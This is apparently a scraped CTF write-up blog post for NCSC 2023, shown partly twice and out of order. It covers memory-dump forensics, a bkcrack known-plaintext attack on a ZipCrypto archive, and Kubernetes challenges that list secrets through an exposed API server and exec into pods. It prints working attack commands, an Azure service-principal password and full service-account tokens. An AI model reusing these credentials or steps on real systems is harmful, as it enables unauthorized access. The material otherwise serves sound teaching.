4F639BBA\nMethod = ZipCrypto Store\nHost OS = FAT\nVersion = 20\nVolume Index = 0\n```\n\nNice the flag.txt size is 40 bytes! So our flag is 40-chars strings! The encryption method is `ZipCrypto`!\n\nBingoo! This method is vulnerable! Let's check how can we get our flag!\n\nAfter some searching we found a repository talking about \"Crack legacy zip encryption with Biham and Kocher's known plaintext attack.\"\n\n\nI recommend to check this [repo](https://github.com/kimci86/bkcrack) and understand how this attack can be manipulated and how to install that tool! \n\nLet's now start downloading the tool \n\n```bash wget\nwget https://github.com/kimci86/bkcrack/releases/download/v1.5.0/bkcrack-1.5.0-Linux.tar.gz\n```\nWe need to recover the internal key that will allow us to extract the file! \n\nThe attack requires at least 12 bytes of known plaintext. At least 8 of them must be contiguous. The larger the contiguous known plaintext, the faster the attack. In our case we have a flag.txt that contains `Securinets{*}`\n\nIn our case we know 11 chars (`Securinets{`) and the last char `}`\n\nLet's recover our key now! \n\n```bash prepare our data\necho -n \"Securinets{\" > plaintext.txt\necho -n \"}\" | xxd # 7d is the result\n```\n\nThe attack requires the plain text content and in case there is another seperate bytes we can specify the offset and the byte value in hex \n\nNow time to work !\n```bash get the key\nbkcrack-1.5.0-Linux/bkcrack -C flag.zip -c flag.txt -p plaintext.txt -x 39 7d \n\nbkcrack 1.5.0 - 2022-07-07\n[16:21:19] Z reduction using 4 bytes of known plaintext\n100.0 % (4 / 4)\n[16:21:19] Attack on 1405963 Z values at index 6\nKeys: 184a904b d4557686 2222c7f2\n9.2 % (129555 / 1405963)\n[16:24:40] Keys\n184a904b d4557686 2222c7f2\n```\nWe got the keys ! `184a904b d4557686 2222c7f2`. Now we can decipher/decrypt the file! which means extract it from the zip! \n\n```bash extract \nbkcrack-1.5.0-Linux/bkcrack -C flag.zip -c flag.txt -k 184a904b d4557686 2222c7f2 -d my_flag.txt   \n\nbkcrack 1.5.0 - 2022-07-07\n[16:32:25] Writing deciphered data my_flag.txt (maybe compressed)\nWrote deciphered data.\n```\nBingo We got the flag!!! How 2 images can hide data like that! \n\n![](https://imgur.com/O8uXhZV.png)\n\nFlag: `Securinets{Z1p_CRyPt0_&_5t3gH1d3_1s_BAd}`\n\n# Kubernetes challenge serie\n\nNCSC'2023 consider the 1st tunisian CTF competition that have a whole Kubernetes Category! These are oriented for beginners/Intermediate users to consodilate their basic knowledge in Kubernetes!\n\n![](https://imgur.com/U69KQtM.png)\n\n## Kubernetes: Secrets:\nIn this challenge we get an IP and the author told us that he have a secret in the cluster! \n![](https://imgur.com/PCmO273.png)\n\nVisiting the IP on the browser will lead us to the author page! This is not our objective! \n\nWe need to access to the API-Server. Let's check the default port 6443\n\n```bash curl\ncurl -sk https://20.169.73.19:6443/version\n```\nAnd this request is failed! Mmmm The author change the default api-server?? Nmap time! Let's scan that IP! \n\nAfter checking the IP we get that port opened 7443! \n\n![](https://imgur.com/GunNYhA.png)\n\nAnd Yes! We got a response! It's KUBERNETES TIME!! \n\nLet's check what permission we have as an anonymous users! To be honest I'll try to check if I can got namespaces Or secrets first! Let me check that! \n\n```bash curl-namespaces\ncurl -sk https://20.169.73.19:7443/api/v1/namespaces | grep '\"name\": \"'\n```\nAnd we got a list of namespaces! This is cool! We have `task1,task2,task3 and task4` namespaces! I bet that each challenge is in single namespace! This is Great! \n![](https://imgur.com/vZrtZLd.png)\n\nHummm We need secrets and this is the 1st challenge! So We are sure that we can list the secrets in the `task1` namespace! \n\n```bash curl-namespaces\ncurl -sk https://20.169.73.19:7443/api/v1/namespaces/task1/secrets\n```\nBingo We got the Secrets List! We are on the right way! \n![](https://imgur.com/0PFJsCI.png)\n\nFlag : `Securinets{S3crEts_Ar3_S0_CriT1c4LL}`\n\n> We got a message! We must check it for sure! \n\nLook what we got here ! \n\n```text check\nLook here YOU will need this one believe me!!!\n eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg\n```\n\n## Kubernetes: Pody:\n\nAfter getting the secrets we can move to the next challenge that named `Pody`\n\n![](https://imgur.com/hZQya2W.png)\n\nIn this challenge the author told us that the container is inside a pod! So how can we get inside that pod? Thinking a little bit we didn't get any solution expect opening a shell session inside the pod! \n\nKubectl Are you there?? Yes! It's Kubectl time! I love to work with kubectl I will not waste my time curling endpoints :) So I'll make my kubeconfig file for this challenge! \n\nWhen I checked the secrets in the previous challenge I got the certificate authority Certifcate. And of course don't forget the token that we got! \n\n> This token is used for authentication and authorization in kubernetes. This authorization is occur on the api-server level not the etcd! \n\nLet's make our kubeconfig! But wait! In case you don't have kubectl, it's time to install it! You can follow this [guide](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/) to install it\n\n```yaml kubeconfig\napiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    certificate-authority-data:  LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJek1ETXdOVEV5TWpVMU1sb1hEVE16TURNd01qRXlNalUxTWxvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTDEzCm0rOG5ySVlXU21hQjREMU9yWWJVS1hycE4rS2ZUZDk1TjA2UTQ5U3IyUU1FZkZXZHhjSGJadThRVWRIVXo1dFcKdmVvRnk4cFBpcmhhNHdGYnJEbXczdFp4NlgxbGxEZlp4b29jd1ZBOS9pMTBjNGE4TURvOGVuc1hlYWU1TytZcQpMZmdiM04zcWZYYjZmSHAzekwxeHJzWThPUEZVeHhmU3AxaElXa0RNZ0tZY0lhU2NoRVUzYTk0ZityY2tIOUFwCnltRi95TlB3bXgyU1RFZUVFSkZoZFdWUzVVamdSTmxnNzFPWklyb05DMXMzWEJxb2RiZ1FWUjBUeTI5bnJGc0QKQnBJQW1WQVRCS3QxTjcyRjRMRDA0c3M3QVUxU0NDSCtoUmlrTWE1ZkdtOTBjMWRacEVuZ1IyVEUwSzZ4WVY3TAplOElrcE5WOVBaLy9RT2ZqSnFFQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZBWWUzVktNRDY3T3V5NWhWTGxTN0RWeU52SExNQlVHQTFVZEVRUU8KTUF5Q0NtdDFZbVZ5Ym1WMFpYTXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBSE9EMUNTNGQzNjJLRXE1dTZyQwpQOEF6a3hDMTJDdVF1bDh4aUVTajZ4M25wb25oT2M3WU0zRUhQZk5wNHRDZmNsdFpDMU51SXNrVDRuSkRLRTFYCjRNVFNOL0kxVDlGSHd5SUhNbDZMZm1RL1ZLVlo1YlZJMEZlUENQanFnOWZSbHFYaitsRUxJQnRJVE0xbUlmeW0KZlZmMisrS3h4OTFTME54bWRKUzU0amY1SUJMRVh2SnRiWFYrblZ1ekhER3l5eDREblVDMm4zR3NrcEtBOGRJRQpZZktRWk5IZjJ4L0FySWM2a3A0em9TSWI1RVQvdDk4b3p5R2pldlVnbDd1L0orUzkwTS9pWWgyaGlGSXRRVE1WCnBTa0pQM1lIbDlzWVRSS0dXZTBtcEtnVm1RZm9VTVNzdURrRnZ4ZFNhVG9QQUN6aUdxdUNnVXVyWHMxNXJjOWkKR2xBPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==\n    server: https://20.169.73.19:7443\n  name: raf-k8s\ncontexts:\n- context:\n  name: ncsc-sa@raf-k8s\n  context:\n    cluster: raf-k8s\n    user: ncsc-sa\ncurrent-context: ncsc-sa@raf-k8s\nusers:\n- name: ncsc-sa\n  user:\n    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg\n```\nThis kubeconfig file will allow us to authenticate to the api-server using kubectl utility without wasting time specifying the token and other stuff!\n\nAssume that you save that file in name `ncsc-k8s.conf`. Let's export the KUBECONFIG env var.\n\n```bash\n$ export KUBECONFIG=ncsc-k8s.conf\n$ kubectl get pods -n task2 \nNAME      READY   STATUS    RESTARTS        AGE\nweb-app   1/1     Running   3 (2d19h ago)   17d\n```\nBingo !! We got access and everything is ok until now. Let's describe the pod and check what we have first before getting a shell !\n\n```bash describe pod\nkubectl describe pod web-app -n task2   \nName:             web-app\nNamespace:        task2\n...\n...\n    Mounts:\n      /etc/nginx/flag.txt from flag-configmap (rw,path=\"flag.txt\")\n      /var/cache/nginx from tmpfs-2 (rw)\n      /var/run from tmpfs-1 (rw)\n      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-wrfpc (ro)\n...\n```\nWow there is `flag.txt` file inside the pod! Let's be more accurate! The flag is in `/etc/nginx/flag.txt`\n\nLet's get a shell or run a command from the pod using the `kubectl exec` command! \n\n![](https://imgur.com/6QTqehO.png)\n\nYes we got the flag! And another message: Your current token is enough! \n\n> I tried to delete the flag! But as expected the author make the pod Read-only file system\n\nFlag : `Securinets{Ex3c_1s_DAnGer0uS_B3_C4r3fUL}`\n\n## Kubernetes: Hidden? :\n\nWe still have the same token! Our kubectl works fine. So no worries we can do it! \n\n![](https://imgur.com/1Eny78d.png)\n\nIn this challenge the flag is hidden?? But how!? Let's check first what can we do in our `task3` namespace\n\n```bash service\nkubectl get service -n task3        \nNAME      TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE\nweb-app   ClusterIP   10.109.128.98   <none>        80/TCP    17d\n```\nWe can access to services! In case you don't know what is service I recommend to check this [page](https://kubernetes.io/docs/concepts/services-networking/service/). As we understand, There is a pod inside task3 namespace but we don't have any access to it :(!. No worries we still have services! This service as we can see its attached to that pod. Let's get our flag! \n\nAfter a little bit of thinking, I got an idea! Let's access to the service from our previous pod! \n\nYES MAN! pods and services can communicate between each others \n\n![](https://imgur.com/uq3xAoV.png)\n\nOk let's do it then, we have the service internal IP and we can run curl command inside our previous pod! \n\n![](https://imgur.com/DuPq2Sp.png)\n\nBingo! Flag: `Securinets{K8s_S3rV1cEs_ArE_P0wErFull}`\nAnd as Usual! another token for the next challenge :\n```text \nIn The Next Challenge You will Need This one!\n eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrNCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJuY3NjLXBhcnRpY2lwYW50LXRva2VuLTdnZ2JxIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6Im5jc2MtcGFydGljaXBhbnQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIwNmM3OGJhZC01NjAwLTQ2N2QtYjdhYi0wNWQzN2RjMjg0MzIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazQ6bmNzYy1wYXJ0aWNpcGFudCJ9.exWa8skN0HdscxzG2PBFYn9eU9l_sL7hAjUw8sFPsnjUKHPHzmqwDpN4WfSPCHFOfv7KKimYvr9SuMjB75KuapxXKnyBwEaIZEkH3c0lavBCPYfGou_BrVsAHVSdbw6pQ9YYonuc3WTiGkcXC-XjKXfY8PGppmnGh7gUsuxY9xwpju10PutjIs8s0g9z2tTBYUhOraa54WRCODDGw-o415rXsaVHuV8A2Cj3jQZVBzXXi5-snfvjX27-nMyGDh4F0gu8sXD3PZfLjLdrOQpP6s_jzbUN9G1g8iLQTXNjCvgUw2cnBOvWtRGLtbdizOazlKUyJAOSXfmu3W45bMJPOg\n```\n## Kubernetes: Special :\n\nAfter getting the new token it's time to edit the kubeconfig file! Just replace the old toke by the new one! To work with kubectl correctly! \n\n![](https://imgur.com/iFClk1V.png)\n\nSomething Special?? What a special? Everything in Kubernetes is SO Special!! So no worries, We can deal with that kind of things!\n\nTalking about something special take me to think about what we can call it `Custom Resources Definition` in Kubernetes!\n\nIn Kubernetes, a custom resource is an extension of the Kubernetes API that allows you to define your own custom resources with their own custom controllers.\n\nA custom resource definition (CRD) is used to create a new custom resource type in Kubernetes. A CRD defines the structure and behavior of the new custom resource, including its name, attributes, and API endpoints. Once a CRD is defined, instances of the custom resource can be created and managed using Kubernetes tools like kubectl and the Kubernetes API.\n\n```bash api-resources\nkubectl api-resources\nNAME                              SHORTNAMES                                      APIVERSION                             NAMESPACED   KIND\nbindings                                                                          v1                                     true         Binding\ncomponentstatuses                 cs                                              v1                                     false        ComponentStatus\nconfigmaps                        cm                                              v1                                     true         ConfigMap\n...\n...\nrolebindings                                                                      rbac.authorization.k8s.io/v1           true         RoleBinding\nroles                                                                             rbac.authorization.k8s.io/v1           true         Role\npriorityclasses                   pc                                              scheduling.k8s.io/v1                   false        PriorityClass\nncscctfs                                                                          securinets.com/v1alpha1                true         NCSCCtf\n```\nBut wait! I am right! There is an api-group and a custom resource called ncscctfs! \n\nNow it's time to get the flag!\n\n```bash get\nkubectl get ncscctfs -n task4           \nNAME   AGE\nflag   17d\n```\nAnd yes there is a ncscctf resource named flag! Let's describe that thing and get the flag! \n\n```bash describe\nkubectl describe ncscctfs flag -n task4 \n```\n\n![](https://imgur.com/DhelAJU.png)\n\nFlag: `Securinets{CuSt0m_REs0urcEs_ArE_P0wErFul}`\n\n# Final Words\n\nIn conclusion, the success of this event and competition is due in no small part to the dedication and hard work of the technical team. Their expertise and professionalism were instrumental in overcoming the various challenges we faced throughout the event lifecycle, and their tireless efforts ensured that we delivered a product that met the highest standards of quality and performance. On behalf of the team, I would like to express our sincere gratitude to our technical colleagues for their unwavering commitment to the project, and for their invaluable contributions to its success","source":"_posts/Writeups/ncsc2023.md","raw":"---\ntitle: NCSC'2023 Writeup Challenges\ndate: 2023-03-23 11:33:37\ntags:\ncover: https://imgur.com/LJslRYb.png\ncategories:\n- [Writeups]\n---\n\nThe National Cyber Security Congress (NCSC) is a three-day event that brings together cyber security enthusiasts and experts. The event features a wide range of activities, including workshops, talks, conferences, and two exciting CTF competitions.\n\n![](https://imgur.com/LJslRYb.png)\n\nAs a technical team member, I had the chance to create challenges in Kubernetes, Digital Forensics, Misc, Hardware, and Game Hacking categories.\n\n\nThe NCSC CTF provided a unique opportunity for cyber security enthusiasts to demonstrate their problem-solving abilities, teamwork, and technical proficiency in a fun and competitive environment. Overall, the event was an exciting and rewarding experience for all involved.\n\nIn this blog, I will share some write-ups that players have requested!\n\n# Digital Forensics : Mokni & Seals \n\n![](https://i.imgur.com/i231apB.png)\n\nWe got a zip file! I bet that file is a memory dump! So i tried to run the volatility imageinfo plugin but it takes a long time. So I tried to figure out if this file is Linux memory dump or not! \n\n```bash linux or win ? \nraf@4n6nk8s: strings data.raw | grep \"Linux version\" \nLinux version 5.8.0-43-generic (buildd@lcy01-amd64-018) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) 49~20.04.1-Ubuntu SMP Fri Feb 5 09:57:56 UTC 2021 (Ubuntu 5.8.0-43.49~20.04.1-generic 5.8.18)\n```\nAnd yes it's a Linux Memory dump! I guess its time to start finding/making a profile but let me check that is memory dump can be analyzed with a profile or not! \n\n```bash checking\nstrings data.raw | grep -i insmod       \nsudo insmod ./lime-5.8.0-43-generic.ko path=../../Linux64.mem format=raw\nsudo insmod ./lime-5.8.0-43-generic.ko \"path=../../Linux64.mem format=raw\"\nsudo insmod ./lime-5.8.0-43-generic.ko \"path=../../Linux64.mem format=raw\"\n```\nOh! The format is ram! which means that even if we get the correct profile volatility can't analyze this memory dump! Strings time! The author want us to solve this mem dump using strings !\n\nLet's try to figure out some command lines! Bash history! Let me show you this trick! \n\n```bash extract bash history \nstrings data.raw | grep -Ei \"@*:~\\\\$\"     \nraf-square@ubuntu:~$ vim /etc/containers/registries.conf\nraf-square@ubuntu:~$\nraf-square@ubuntu:~$ echo \"This Is My Secret\" > secret.txt\nraf-square@ubuntu:~$\nraf-square@ubuntu:~$ podman login -u $(head -n 2 secret.txt | tail -n 1 | awk '{ print $4 }') -p $(head -n 3 secret.txt | tail -n 1 | awk '{ print $4 }')\nraf-square@ubuntu:~$ podman pull nginx\n^Craf-square@ubuntu:~$ cd LiME/src/\nraf-square@ubuntu:~$ vim /etc/containers/registries.conf\nraf-square@ubuntu:~$\nraf-square@ubuntu:~$ vim /etc/containers/registries.conf\nraf-square@ubuntu:~$\nu:~$ podman login -u $(head -n 2 secret.txt | tail -n 1 | awk '{ print $4 }') -p $(head -n 3 secret.txt | tail -n 1 | awk '{ print $4 }')\n```\nMmmm nice! now at least we got some commands and we got the user-name and host-name !\nFrom these commands we can understand that the user edit `/etc/containers/registries.conf`, then create a `secret.txt`. Then logged in with podman using that secret.txt. But we don't have any information about the content of the creds in these commands!.\n\nWe have 2 methods to figure out what's happen and get the creds! \n\neither running a strings and grepping on `CMDLINE=podman login` or grepping on `This Is My Secret` and check the lines before and after to see the content! \n\n```bash extract creds\nstrings data.raw | grep -Ei \"CMDLINE=podman login\"       \n_CMDLINE=podman login -u 2ecf92b1-83a8-4355-8cb7-8354f4677894 -p fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb\n```\n\nOR \n\n```bash extract creds\nstrings data.raw | grep -Ei -C 2 \"This Is My Secret\" \n Documents  LiME         Music     Public      Templates\nDesktop  Downloads  Linux64.mem  Pictures  secret.txt  Videos\nraf-square@ubuntu:~$ echo \"This Is My Secret\" > secret.txt\nraf-square@ubuntu:~$\nfctt\n--\napplication/octet-stream\ntext/plain\nThis Is My Secret\nService principal ID: 2ecf92b1-83a8-4355-8cb7-8354f4677894\nService principal password: fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb\n--\n```\n\nSo the creds are `2ecf92b1-83a8-4355-8cb7-8354f4677894:fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb`\n\nBut I didn't think this is a normal creds for `dockerhub` or any public famous container registry! Espacially he pulled a container named nginx! I bet that nginx is a customized one and its a trick! \n\nEditing `/etc/containers/registries.conf` can confirm that change something! This configuration file used by the container runtime environment on Linux systems. This file specifies a list of container image registries that are trusted by the system and can be used to download container images.\n\nSo let's discover how to get the registry! Pulling nginx means he pulled the latest tag or at least he tried that! So let's grep on `nginx:latest`\n\n```bash extract registry\nstrings data.raw | grep -Ei \"nginx:latest\"  \nTrying to pull qualsk8s.azurecr.io/nginx:latest...\nTrying to pull qualsk8s.azurecr.io/nginx:latest...\n\", \"qualsk8s.azurecr.io/nginx:latest\") not found\nTrying to pull qualsk8s.azurecr.io/nginx:latest...\nTrying to pull qualsk8s.azurecr.io/nginx:latest...\nTrying to pull qualsk8s.azurecr.io/nginx:latest...\n```\n\nBingo! `qualsk8s.azurecr.io` is the container registry! If you are an Azure guy you can get that from the previous step! when we get this output!\n\n``` text creds\nService principal ID: 2ecf92b1-83a8-4355-8cb7-8354f4677894\nService principal password: fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb\n```\n\nOk it's time to login and pull that image and run it! \n\n```bash login and pull\ndocker login qualsk8s.azurecr.io -u 2ecf92b1-83a8-4355-8cb7-8354f4677894 -p fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb \n\ndocker pull nginx\n```\n\nAfter checking the image! I got that it's a static web page so let's run it!\n\n```bash run nginx\ndocker run --name chall -p 80:80 -d nginx \n```\nAfter running this container we got this web-page and guess what!! There is a flag icon! Let's check it !\n![](https://i.imgur.com/q3GSPiL.png)\n\nThis flag icon lead you to this link `https://pastebin.com/vjFtjMga` which is protected pastebin\nhow to get that password now! Let's check the docker history! \n\n```bash docker history\nmohamed@RafSquare:~$ docker history qualsk8s.azurecr.io/nginx\nIMAGE          CREATED       CREATED BY                                      SIZE      COMMENT\n093f65335d3a   13 days ago   ENTRYPOINT [\"nginx\" \"-g\" \"daemon off;\"]         0B        buildkit.dockerfile.v0\n<missing>      13 days ago   RUN /bin/sh -c chmod +r -R . # buildkit         563kB     buildkit.dockerfile.v0\n<missing>      13 days ago   RUN /bin/sh -c mv password.txt .hidden.txt #…   11B       buildkit.dockerfile.v0\n<missing>      13 days ago   COPY ./ ./ # buildkit                           563kB     buildkit.dockerfile.v0\n<missing>      3 weeks ago   RUN /bin/sh -c rm -rf ./* # buildkit            0B        buildkit.dockerfile.v0\n<missing>      3 weeks ago   WORKDIR /usr/share/nginx/html                   0B        buildkit.dockerfile.v0\n<missing>      5 weeks ago   /bin/sh -c set -x     && apkArch=\"$(cat /etc…   29.2MB\n<missing>      5 weeks ago   /bin/sh -c #(nop)  ENV NJS_VERSION=0.7.9        0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  CMD [\"nginx\" \"-g\" \"daemon…   0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  STOPSIGNAL SIGQUIT           0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  EXPOSE 80                    0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  ENTRYPOINT [\"/docker-entr…   0B\n<missing>      5 weeks ago   /bin/sh -c #(nop) COPY file:e57eef017a414ca7…   4.62kB\n<missing>      5 weeks ago   /bin/sh -c #(nop) COPY file:abbcbf84dc17ee44…   1.27kB\n<missing>      5 weeks ago   /bin/sh -c #(nop) COPY file:5c18272734349488…   2.12kB\n<missing>      5 weeks ago   /bin/sh -c #(nop) COPY file:7b307b62e82255f0…   1.62kB\n<missing>      5 weeks ago   /bin/sh -c set -x     && addgroup -g 101 -S …   4.45MB\n<missing>      5 weeks ago   /bin/sh -c #(nop)  ENV PKG_RELEASE=1            0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  ENV NGINX_VERSION=1.23.3     0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  LABEL maintainer=NGINX Do…   0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  CMD [\"/bin/sh\"]              0B\n<missing>      5 weeks ago   /bin/sh -c #(nop) ADD file:40887ab7c06977737…   7.05MB\n```\nAnd yes!! There is `.hidden.txt` that contain a password for sure ! let's get that password! \n\n```bash docker exec \ndocker exec -it 460fc5a977c5 cat .hidden.txt\nvT56X19Qu3\n```\nWe got this pastebin !\n\n![](https://i.imgur.com/N4B9j4z.png)\n\nThis is will lead us to word sheet that contains a hex data! \n\n![](https://i.imgur.com/P0hrYhX.png)\n\nThe hex data seams introducing spaces and tabs! I don't care let's decode it and see what's will be! \nI'll try to convert it to a file using `xxd` and import that file to dcode.fr \n\n```bash xxd\nxxd -r -p hex.txt > result.txt\n```\n\nYeah it's a file that contains a lot of spaces! Its whitespaces \n\nBingo! This is the flag `Securinets{208e5976c9d654e47d73ef44cabc272d}`\n\n\n\n# Digital Forensics: Recover my Work :(\n\n![](https://i.imgur.com/DWMzUMB.png)\n\nWe got a file named `memory.dmp`. It's a memory dump for sure! Let's run imageinfo plugin to get our profile! \n``` bash profile \nvol.py -f memory.dmp imageinfo\nVolatility Foundation Volatility Framework 2.6.1\nINFO    : volatility.debug    : Determining profile based on KDBG search...\nWARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow\nWARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow\nWARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow\nWARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow\n```\n\nBut sadly we got this type of outpût! I bet that the suggested profile (in case it exists) will be wrong! Let's know the exact profile with my own way! Let's run strings the file and grep \"service pack\"\n\n``` text Extract info\nWindows 7 Professional, 64-bit Service Pack 1 (Build 7601)\n```\n\nCool, This build and service pack is supported by `Win7SP1x64`! I guess that imageinfo plugin got problem because the iso is customizated !\n\nLet's start checking our memory dump! First thing should be checked is the running processes! I'll use pstree for that thing!\n\n![](https://i.imgur.com/1xA56pZ.png)\n\nMMMM intersting! Found chrome, firefox, outlook and RDP opened! what a trip! After digging on chrome history and firefox, I found rabbit holes and some links to wordlists! Bad Author (Me). \n\nChecking the consoles plugin too. Another rabbit hole! rabbit hole everywhere! \n\nIt's time to check and figure out that outlook process!\nOutlook save the mails as pst or ost files! These files contains the mails data such as the message, attachements, sender/receiver information! \n\nSo let's try to extract these files ! \n\n```bash check files \nvol.py -f memory.dmp --profile=Win7SP1x64 filescan | grep -i pst$\n0x000000007d81a490      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Outlook.pst\n0x000000007dd59340      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Work Progress.pst\n0x000000007dd73220      1      0 R--rw- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Work Progress.pst\n0x000000007e3f8b30      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Forgot the password.pst\n0x000000007e5297a0      1      0 R--rw- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Forgot the password.pst\n0x000000007e5eee60     30      0 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Outlook.pst\n```\nAfter extracting the files using `dumpfiles` plugin and making sure that the files are safe and not corrupted. I opened them using a pst online viewer! \n\nThe 1st mail i got it is from Adam! He send to me a zip file inside mega storage after our online meeting! I bet that zip is protected with that boring password\n\n![](https://i.imgur.com/9a0GCzz.png)\n\nAh my bad! The mega too is protected! We need the encryption key! \n\n![](https://i.imgur.com/hEG0dsu.png)\n\nLet's check the other mail! and as expected Adam forget to share the decryption key of the mega link to open the zip! \n\n![](https://i.imgur.com/wB3m3QV.png)\n\nBingo we got the zip! But it's protected! Tried bruteforcing the password. But I failed! \n\nMmmm Let's think a little bit! The author said that he used to use the same password! We need to find another usage of that password 